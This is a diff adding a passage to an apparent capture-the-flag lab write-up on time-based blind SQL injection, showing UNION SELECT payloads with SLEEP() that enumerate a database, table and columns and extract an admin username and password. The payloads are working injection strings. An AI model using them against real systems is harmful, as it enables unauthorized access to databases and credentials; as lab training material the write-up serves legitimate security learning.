@@ -343,6 +343,53 @@ If there was no pause in the response time, we know that the query was unsuccess
 
 This payload should have produced a 5-second delay, confirming the successful execution of the UNION statement and that there are two columns.
 
+You can now repeat the enumeration process from the Boolean-based SQL injection, adding the SLEEP() method to the UNION SELECT statement.
+
+Now checking if the database exist by `admin123' UNION SELECT IF(database() LIKE 'a%',SLEEP(5),0),2;--` which also gives us a 5 second delay meaning now we can brute force the database name.
+
+<img width="1002" height="195" alt="image" src="https://github.com/user-attachments/assets/88f40b1d-bfaa-40e6-a461-0b268d750d05" />
+
+Lets start by first checking a letter: `admin123' UNION SELECT IF(database() LIKE 'a%',SLEEP(5),0),2;--`
+
+<img width="1004" height="201" alt="image" src="https://github.com/user-attachments/assets/7de6b7c1-7f5a-4793-b139-0686bad8098c" />
+
+It does not give us a 5 second delay meaning it does not start with letter a, then checking other letters we get 5 second delay at letter s: `admin123' UNION SELECT IF(database() LIKE 's%',SLEEP(5),0),2;--`
+
+<img width="1010" height="195" alt="image" src="https://github.com/user-attachments/assets/174f7469-5bbf-426b-8be0-db5c0331f952" />
+
+Now again lets brute force starting with letters sa, so we see that it gives us 5 second delay at letters sq: `admin123' UNION SELECT IF(database() LIKE 'sq%',SLEEP(5),0),2;--`
+
+<img width="1010" height="204" alt="image" src="https://github.com/user-attachments/assets/c4c437ee-2011-4f4c-8575-078b1e7d5a26" />
+
+Now checking again, at the end we get database name `sqli_four`
+
+Then you will brute force the table name like `admin123' UNION SELECT 1,2 FROM information_schema.tables WHERE table_schema='sqli_four' AND table_name LIKE 'a%';--`
+
+Then we will get table name `users`
+
+Now brute forcing the column names: `admin123' UNION SELECT IF(EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema='sqli_four' AND table_name='users' AND column_name LIKE 'a%'),SLEEP(5),0),2;--`
+
+We got column name id, now bruteforcing other columns except id: `admin123' UNION SELECT IF(EXISTS( SELECT 1 FROM information_schema.columns WHERE table_schema='sqli_four' AND table_name='users' AND column_name LIKE 'u%' and COLUMN_NAME !='id'),SLEEP(5),0),2;--`
+
+<img width="1019" height="193" alt="image" src="https://github.com/user-attachments/assets/8527d787-1606-4179-a6a0-43d446fea6ae" />
+
+We discovered another column id and username, now probably there is one more column as password, so there are three columns.
+
+Now we know the table name users so now bruteforcing the usernames: `admin123' UNION SELECT IF(EXISTS( SELECT 1 FROM users WHERE username like 'a%'),SLEEP(5),0),2;--`
+
+So we get username admin now bruteforcing password as it will most probably be number: `admin123' UNION SELECT IF(EXISTS( SELECT 1 FROM users WHERE password like '1%'),SLEEP(5),0),2;--`
+
+We discover that the username is admin and password is 4961.
+
+---
+
+### Answer the questions below
+
+What is the final flag after completing level four?
+
+<img width="1877" height="336" alt="image" src="https://github.com/user-attachments/assets/f55e557f-0386-406c-8ef2-7f6de581267f" />
+
+
 
 
 
